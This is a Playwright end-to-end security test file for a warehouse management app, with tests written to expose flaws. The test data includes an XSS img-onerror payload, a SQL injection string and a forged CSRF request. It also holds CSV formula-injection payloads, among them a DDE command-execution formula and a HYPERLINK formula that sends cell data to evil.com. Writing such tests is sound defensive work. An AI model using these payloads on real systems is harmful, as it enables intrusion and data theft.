import { test, expect } from '@playwright/test';
import { faker } from '@faker-js/faker';

test.describe('Critical E2E Vulnerability Tests', () => {
  test.describe.configure({ mode: 'parallel' });

  test('SHOULD FAIL: Concurrent inventory shipments cause negative stock', async ({ page, context }) => {
    // Login as warehouse staff
    await page.goto('/auth/login');
    await page.fill('input[name="email"]', 'staff@warehouse.com');
    await page.fill('input[name="password"]', 'password123');
    await page.click('button[type="submit"]');
    
    await page.waitForURL('/dashboard');

    // Navigate to inventory
    await page.goto('/operations/inventory');
    
    // Find a product with limited stock
    const productRow = page.locator('tr').filter({ hasText: 'TEST-SKU-001' }).first();
    const stockText = await productRow.locator('td:nth-child(5)').textContent();
    const currentStock = parseInt(stockText || '0');

    // Open multiple tabs to simulate concurrent users
    const pages = [page];
    for (let i = 0; i < 3; i++) {
      const newPage = await context.newPage();
      await newPage.goto('/operations/ship');
      pages.push(newPage);
    }

    // Each tab tries to ship more than 1/3 of available stock
    const shipmentAmount = Math.floor(currentStock / 2);
    
    const shipmentPromises = pages.map(async (p, index) => {
      if (index === 0) return; // Skip the first page (inventory page)
      
      // Fill shipment form
      await p.fill('input[name="trackingNumber"]', `TRACK-${Date.now()}-${index}`);
      await p.fill('input[name="sku"]', 'TEST-SKU-001');
      await p.fill('input[name="quantity"]', shipmentAmount.toString());
      await p.selectOption('select[name="warehouse"]', { index: 1 });
      
      // Submit simultaneously
      return p.click('button[type="submit"]');
    });

    // Execute all shipments at once
    await Promise.allSettled(shipmentPromises);

    // Check final inventory
    await page.reload();
    const finalStockText = await productRow.locator('td:nth-child(5)').textContent();
    const finalStock = parseInt(finalStockText || '0');

    // This should fail - stock should never go negative
    expect(finalStock).toBeGreaterThanOrEqual(0);
  });

  test('SHOULD FAIL: XSS through batch name input', async ({ page }) => {
    await page.goto('/auth/login');
    await page.fill('input[name="email"]', 'admin@warehouse.com');
    await page.fill('input[name="password"]', 'password123');
    await page.click('button[type="submit"]');

    await page.goto('/operations/receive');

    // Try to inject XSS through batch name
    const xssPayload = '<img src=x onerror=alert("XSS")>';
    
    await page.fill('input[name="batchLotNumber"]', xssPayload);
    await page.fill('input[name="sku"]', 'TEST-SKU-001');
    await page.fill('input[name="quantity"]', '100');
    await page.selectOption('select[name="warehouse"]', { index: 1 });
    
    await page.click('button[type="submit"]');

    // Navigate to inventory to see if XSS executes
    await page.goto('/operations/inventory');

    // Set up alert handler
    let alertFired = false;
    page.on('dialog', async dialog => {
      alertFired = true;
      await dialog.dismiss();
    });

    // Wait a bit to see if alert fires
    await page.waitForTimeout(2000);

    // This should fail - XSS should not execute
    expect(alertFired).toBe(false);
  });

  test('SHOULD FAIL: File upload accepts malicious Excel files', async ({ page }) => {
    await page.goto('/auth/login');
    await page.fill('input[name="email"]', 'admin@warehouse.com');
    await page.fill('input[name="password"]', 'password123');
    await page.click('button[type="submit"]');

    await page.goto('/operations/import');

    // Create a malicious Excel file with formula injection
    const maliciousContent = `SKU,Name,Quantity
=cmd|'/c calc'!A1,Malicious,100
TEST-SKU-002,=HYPERLINK("http://evil.com?data="&A1),50`;

    const buffer = Buffer.from(maliciousContent);
    const file = new File([buffer], 'malicious.csv', { type: 'text/csv' });

    // Upload the file
    await page.setInputFiles('input[type="file"]', {
      name: 'malicious.csv',
      mimeType: 'text/csv',
      buffer: buffer
    });

    await page.click('button:has-text("Import")');

    // Check if file was rejected
    const errorMessage = await page.locator('.error-message').textContent();
    
    // This should fail - malicious files should be rejected
    expect(errorMessage).toContain('Invalid file content');
  });

  test('SHOULD FAIL: Brute force login attempts not rate limited', async ({ page }) => {
    const attempts: Promise<any>[] = [];
    const targetEmail = 'admin@warehouse.com';

    // Try 50 rapid login attempts
    for (let i = 0; i < 50; i++) {
      attempts.push(
        page.request.post('/api/auth/login', {
          data: {
            email: targetEmail,
            password: `wrongpass${i}`
          }
        }).catch(e => ({ status: e.response?.status || 0 }))
      );
    }

    const startTime = Date.now();
    const responses = await Promise.all(attempts);
    const duration = Date.now() - startTime;

    // Count rate limited responses
    const rateLimited = responses.filter(r => r.status === 429).length;

    // This should fail - there should be rate limiting
    expect(rateLimited).toBeGreaterThan(40); // Most requests should be rate limited
    expect(duration).toBeGreaterThan(5000); // Should take time due to rate limiting
  });

  test('SHOULD FAIL: SQL injection through search functionality', async ({ page }) => {
    await page.goto('/auth/login');
    await page.fill('input[name="email"]', 'staff@warehouse.com');
    await page.fill('input[name="password"]', 'password123');
    await page.click('button[type="submit"]');

    await page.goto('/operations/inventory');

    // Try SQL injection in search
    const sqlInjection = "' OR '1'='1";
    await page.fill('input[name="search"]', sqlInjection);
    await page.press('input[name="search"]', 'Enter');

    // Check if all records are returned (indicating successful injection)
    await page.waitForTimeout(1000);
    const rowCount = await page.locator('tbody tr').count();
    const totalRecordsText = await page.locator('.total-records').textContent();
    const totalRecords = parseInt(totalRecordsText?.match(/\d+/)?.[0] || '0');

    // If injection worked, it would return all records
    // This should fail - row count should be 0 or filtered results only
    expect(rowCount).toBeLessThan(totalRecords);
  });

  test('SHOULD FAIL: Session remains valid after role downgrade', async ({ page, context }) => {
    // Login as admin
    await page.goto('/auth/login');
    await page.fill('input[name="email"]', 'admin@warehouse.com');
    await page.fill('input[name="password"]', 'password123');
    await page.click('button[type="submit"]');

    // Verify admin access
    await page.goto('/admin/users');
    expect(page.url()).toContain('/admin/users');

    // In another tab, simulate role being changed to 'staff' via API
    const apiContext = await context.request;
    await apiContext.patch('/api/users/current', {
      data: { role: 'staff' }
    });

    // Try to access admin page again in original session
    await page.goto('/admin/users');

    // This should fail - should be redirected as role changed
    expect(page.url()).not.toContain('/admin/users');
  });

  test('SHOULD FAIL: Large file upload causes memory issues', async ({ page }) => {
    await page.goto('/auth/login');
    await page.fill('input[name="email"]', 'admin@warehouse.com');
    await page.fill('input[name="password"]', 'password123');
    await page.click('button[type="submit"]');

    await page.goto('/operations/import');

    // Create a large CSV file (100MB)
    const rows = 1000000; // 1 million rows
    let csvContent = 'SKU,Name,Quantity,Warehouse,Price\n';
    
    for (let i = 0; i < rows; i++) {
      csvContent += `SKU-${i},Product Name ${i},${Math.floor(Math.random() * 1000)},WH1,${(Math.random() * 100).toFixed(2)}\n`;
    }

    const buffer = Buffer.from(csvContent);

    // Set up response interceptor
    let uploadFailed = false;
    page.on('response', response => {
      if (response.url().includes('/api/import') && response.status() >= 500) {
        uploadFailed = true;
      }
    });

    // Try to upload large file
    await page.setInputFiles('input[type="file"]', {
      name: 'large-file.csv',
      mimeType: 'text/csv',
      buffer: buffer
    });

    await page.click('button:has-text("Import")');

    // Wait for response
    await page.waitForTimeout(5000);

    // This should fail - large files should be rejected or handled properly
    expect(uploadFailed).toBe(false);
    
    const errorMessage = await page.locator('.error-message').textContent();
    expect(errorMessage).toContain('File too large');
  });

  test('SHOULD FAIL: Financial calculations lose precision', async ({ page }) => {
    await page.goto('/auth/login');
    await page.fill('input[name="email"]', 'admin@warehouse.com');
    await page.fill('input[name="password"]', 'password123');
    await page.click('button[type="submit"]');

    await page.goto('/finance/invoices/create');

    // Add line items with prices that cause floating point issues
    const problematicPrices = [
      { price: 19.99, quantity: 3 },  // 59.97
      { price: 29.99, quantity: 2 },  // 59.98
      { price: 39.99, quantity: 1 }   // 39.99
    ];

    for (const item of problematicPrices) {
      await page.click('button:has-text("Add Line Item")');
      const lastRow = page.locator('.line-item-row').last();
      await lastRow.locator('input[name="price"]').fill(item.price.toString());
      await lastRow.locator('input[name="quantity"]').fill(item.quantity.toString());
    }

    // Get calculated total
    const displayedTotal = await page.locator('.invoice-total').textContent();
    const calculatedTotal = parseFloat(displayedTotal?.replace(/[^0-9.]/g, '') || '0');

    // Expected: 59.97 + 59.98 + 39.99 = 159.94
    const expectedTotal = 159.94;

    // This should fail if there are precision errors
    expect(calculatedTotal).toBe(expectedTotal);
  });

  test('SHOULD FAIL: CSRF protection on state-changing operations', async ({ page, context }) => {
    // Login normally
    await page.goto('/auth/login');
    await page.fill('input[name="email"]', 'admin@warehouse.com');
    await page.fill('input[name="password"]', 'password123');
    await page.click('button[type="submit"]');

    // Get session cookie
    const cookies = await context.cookies();
    const sessionCookie = cookies.find(c => c.name === 'session');

    // Try CSRF attack from different origin
    const response = await page.request.post('/api/warehouses/delete', {
      headers: {
        'Cookie': `session=${sessionCookie?.value}`,
        'Origin': 'http://evil-site.com',
        'Referer': 'http://evil-site.com'
      },
      data: {
        warehouseId: 'warehouse-123'
      }
    });

    // This should fail - CSRF attack should be blocked
    expect(response.status()).toBe(403);
  });
});